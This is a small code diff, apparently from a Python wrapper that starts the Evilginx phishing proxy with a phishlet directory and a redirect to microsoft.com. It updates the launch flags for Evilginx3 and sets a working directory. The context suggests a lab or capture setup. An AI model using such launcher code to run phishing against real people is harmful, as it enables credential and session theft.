@@ -687,11 +687,11 @@ redirect_url: https://www.microsoft.com
             # Start Evilginx2
             log_file = os.path.join(CONFIG['PCAP_DIR'], 'evilginx.log')
             
-            # Command to run
+            # Evilginx3+ uses different flags (no -d for database)
+            # Database is stored in ~/.evilginx by default
             cmd = [
                 self.evilginx_path,
-                '-p', phishlet_dir,
-                '-d', self.db_path
+                '-p', phishlet_dir
             ]
             
             log(f"Starting: {' '.join(cmd)}")
@@ -701,6 +701,7 @@ redirect_url: https://www.microsoft.com
                 stdin=subprocess.PIPE,
                 stdout=open(log_file, 'a'),
                 stderr=subprocess.STDOUT,
+                cwd=self.config_dir,
                 preexec_fn=os.setpgrp
             )
             
